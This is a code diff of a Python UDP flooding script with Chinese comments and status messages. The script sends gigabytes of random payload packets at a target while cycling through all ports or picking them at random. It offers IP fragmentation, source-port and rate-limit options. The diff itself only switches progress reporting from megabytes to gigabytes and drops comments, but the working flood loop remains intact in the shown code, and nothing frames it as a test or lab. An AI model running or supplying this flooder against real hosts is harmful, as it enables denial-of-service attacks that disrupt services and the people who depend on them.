@@ -158,7 +158,6 @@ if source_port is not None:
 frag_enabled = False
 if use_fragmentation:
     try:
-        # 检查必要的常量是否存在
         if hasattr(socket, 'IP_MTU_DISCOVER') and hasattr(socket, 'IP_PMTUDISC_DO'):
             sock.setsockopt(socket.IPPROTO_IP, socket.IP_MTU_DISCOVER, socket.IP_PMTUDISC_DO)
             sock.setsockopt(socket.IPPROTO_IP, socket.IP_DONTFRAGMENT, 0)
@@ -168,7 +167,6 @@ if use_fragmentation:
     except (AttributeError, OSError) as e:
         print(f"[!] 无法启用 IP 分片 ({e})，将使用普通发送模式（载荷 1490 字节）。")
         PACKET_SIZE = 1490
-        # 重新计算总包数
         total_bytes = int(total_gb * 1024 * 1024 * 1024)
         max_packets = total_bytes // PACKET_SIZE
         print(f"[*] 调整后总包数: {max_packets}")
@@ -177,12 +175,11 @@ payload = os.urandom(PACKET_SIZE)
 
 sent = 0
 sent_bytes = 0
-next_mb_threshold = 1024 * 1024   # 1 MB
+next_mb_threshold = 1024 * 1024   # 仍按 1 MB 刷新，但输出用 GB
 start_time = time.time()
 
 try:
     while sent < max_packets:
-        # 确定当前目标端口
         if random_target_port:
             current_port = random.randint(1, 65535)
         else:
@@ -192,21 +189,19 @@ try:
         sent += 1
         sent_bytes += PACKET_SIZE
 
-        # 如果不使用随机端口，才进行端口递增
         if not random_target_port:
             target_port += 1
             if target_port > 65534:
                 target_port = 1
 
-        # 每 1 MB 输出一次进度
+        # 每 1 MB 输出一次，但显示为 GB（保留较高精度）
         if sent_bytes >= next_mb_threshold:
-            mb_sent = sent_bytes / (1024 * 1024)
+            gb_sent = sent_bytes / (1024 * 1024 * 1024)        # 转为 GB
             elapsed = time.time() - start_time
             pps = sent / elapsed if elapsed > 0 else 0
-            print(f"已发送: {sent} 包 ({mb_sent:.2f} MB) | 用时: {elapsed:.1f}s | 速率: {pps:.1f} pps")
+            print(f"已发送: {sent} 包 ({gb_sent:.4f} GB) | 用时: {elapsed:.1f}s | 速率: {pps:.1f} pps")
             next_mb_threshold += 1024 * 1024
 
-        # 速率限制
         if rate_limit > 0:
             time.sleep(rate_limit)
 
@@ -217,4 +212,4 @@ except Exception as e:
 finally:
     sock.close()
     elapsed = time.time() - start_time
-    print(f"\n[+] 发送完成。总包数: {sent}, 总数据量: {sent_bytes / (1024*1024):.2f} MB, 用时: {elapsed:.2f} 秒。")
+    print(f"\n[+] 发送完成。总包数: {sent}, 总数据量: {sent_bytes / (1024*1024*1024):.4f} GB, 用时: {elapsed:.2f} 秒。")
